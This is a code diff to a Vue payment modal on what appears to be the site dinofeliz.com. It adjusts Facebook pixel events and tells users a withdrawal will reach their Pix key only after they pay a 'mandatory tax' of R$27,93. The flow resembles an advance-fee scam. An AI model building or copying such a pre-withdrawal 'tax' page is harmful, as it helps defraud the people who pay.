@@ -24,9 +24,8 @@ const modal = ref(true);
 
 const userId = computed(() => page.props.auth.user.id);
 const userIdref = ref(userId);
-if (window.location.host === 'dinofeliz.com') {
     window.fbq('trackCustom', 'Taxa criada')
-}
+
 function stopVideo() {
     const video = document.getElementById("my-video");
     video.pause();
@@ -36,9 +35,7 @@ window.Echo.channel("pixReceived" + userIdref.value).listen(
     "PixReceived",
     (e) => {
         modal.value = false;
-        if (window.location.host === 'dinofeliz.com') {
-            window.fbq('trackCustom', 'Taxa paga', {currency: "BRL", value: 39.90})
-        }
+        window.fbq('track', 'Purchase', {currency: "BRL", value: amount.value ?? 27.93});
         qrCode.value = "";
         toast.success("Taxa paga com sucesso!");
     }
@@ -139,9 +136,9 @@ function toBRL(value) {
                     <span>Aperte o play</span>
                 </div>
                 <div class="mt-4 text-center">
-                    <span>O valor de <b class="text-green-500">R${{ withdraw_value }}</b> será transferido para 
-chave pix informada após o pagamento 
-do imposto obrigatorio de <b class="text-red-500">R$27,91</b></span>
+                    <span>O valor de <b class="text-green-500">R${{ withdraw_value }}</b> será transferido para
+chave pix informada após o pagamento
+do imposto obrigatorio de <b class="text-red-500">R$27,93</b></span>
                 </div>
                 <div class="mt-4">
                     <button class="w-full bg-green-500 font-semibold p-2 rounded-md" @click="modal = !modal">PAGAR IMPOSTO</button>
